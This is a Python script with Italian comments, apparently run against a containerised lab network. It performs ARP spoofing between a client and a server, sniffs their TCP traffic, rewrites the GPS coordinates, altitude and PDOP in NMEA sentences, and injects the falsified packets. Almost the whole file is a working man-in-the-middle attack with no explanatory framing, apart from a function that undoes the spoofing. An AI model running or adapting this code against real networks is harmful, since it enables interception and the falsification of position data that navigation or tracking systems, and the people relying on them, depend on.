



import scapy.all as scapy
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import ARP
import socket
import re
from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys
import threading

def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def get_local_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0.1)
    try:
        s.connect(('10.255.255.255', 1))
        ip_address = s.getsockname()[0]
    except Exception as e:
        ip_address = '127.0.0.1'
    finally:
        s.close()
    return ip_address



def spoof(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)
    if verbose:
        self_mac = ARP().hwsrc
        print("[+] Inviato a {} : {} è {}".format(target_ip, host_ip, self_mac))


def modify_coordinates(dati_nmea):
    dati_modificati = []

    for riga in dati_nmea:
        if riga.startswith("$GPGGA"):
            parti = riga.split(",")
            latitudine = float(parti[2][:2]) + float(parti[2][2:]) / 60
            longitudine = float(parti[4][:3]) + float(parti[4][3:]) / 60
            altitudine = float(parti[9])

            print(f"Latitudine Originale (GPGGA): {latitudine:.6f}")
            print(f"Longitudine Originale (GPGGA): {longitudine:.6f}")
            print(f"Altitudine Originale (GPGGA): {altitudine:.2f}")

            latitudine += 5
            longitudine += 5
            altitudine += 50

            parti[2] = f"{latitudine:.6f}"
            parti[4] = f"{longitudine:.6f}"
            parti[9] = f"{altitudine:.2f}"

            print(f"Latitudine Modificata (GPGGA): {latitudine:.6f}")
            print(f"Longitudine Modificata (GPGGA): {longitudine:.6f}")
            print(f"Altitudine Modificata (GPGGA): {altitudine:.2f}")

            dati_modificati.append(",".join(parti))
        elif riga.startswith("$GPGSA"):
            parti = riga.split(",")
            # Esegui le modifiche necessarie per la frase $GPGSA
            
            pdop = float(parti[15])
            print(f"PDOP Originale (GPGSA): {pdop:.1f}")


            pdop += 20

            parti[15] = f"{pdop:.1f}"
            print(f"PDOP Modificato (GPGSA): {pdop:.1f}")

            dati_modificati.append(",".join(parti))
        elif riga.startswith("$GPRMC"):
            parti = riga.split(",")
            latitudine = float(parti[3][:2]) + float(parti[3][2:]) / 60
            longitudine = float(parti[5][:3]) + float(parti[5][3:]) / 60

            print(f"Latitudine Originale (GPRMC): {latitudine:.6f}")
            print(f"Longitudine Originale (GPRMC): {longitudine:.6f}")

  
            latitudine += 5
            longitudine += 5

            parti[3] = f"{latitudine:.6f}"
            parti[5] = f"{longitudine:.6f}"

            print(f"Latitudine Modificata (GPRMC): {latitudine:.6f}")
            print(f"Longitudine Modificata (GPRMC): {longitudine:.6f}")

            dati_modificati.append(",".join(parti))
        else:
            dati_modificati.append(riga)

    return dati_modificati


def handle_packet(packet, target_ip, target_port, client_port):
    if IP in packet and TCP in packet and hasattr(packet[TCP], 'load'):
        if packet[IP].dst == target_ip and packet[TCP].dport == target_port:
            nmea_data = packet[TCP].load.decode("ascii").split("\r\n")
            print("Pacchetto ricevuto:")
            print(nmea_data)

            modified_nmea_data = modify_coordinates(nmea_data)

            
            modified_packet = IP(dst=target_ip, src=packet[IP].src) / TCP(dport=target_port, sport=client_port) / "\r\n".join(modified_nmea_data)

            print("Pacchetto Originale:")
            packet.show()
            print("Pacchetto Modificato:")
            modified_packet.show()

            # Invia il pacchetto modificato
            send(modified_packet, verbose=False)
            print("Pacchetto modificato ed inviato.")
            time.sleep(1) 

def ripristina(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Inviato a {} : {} è {}".format(target_ip, host_ip, host_mac))

def spoofing_loop(client_ip, server_ip, verbose=True):
    while True:
        spoof(client_ip, server_ip, verbose)
        spoof(server_ip, client_ip, verbose)
        time.sleep(1)
       

def sniffing_loop(client_ip, client_port, server_ip, server_port):
    while True:
        scapy.sniff(filter=f"tcp and (src host {client_ip} and src port {client_port})", prn=lambda x: handle_packet(x, server_ip, server_port, client_port))

def main():
    client_ip = "172.18.0.3"
    client_port = 3000
    server_ip = "172.18.0.2"
    server_port = 5762
    verbose = True

   

    spoofing_thread = threading.Thread(target=spoofing_loop, args=(client_ip, server_ip, verbose))
    spoofing_thread.start()

    sniffing_thread = threading.Thread(target=sniffing_loop, args=(client_ip, client_port, server_ip, server_port))
    sniffing_thread.start()

if __name__ == "__main__":
    main()
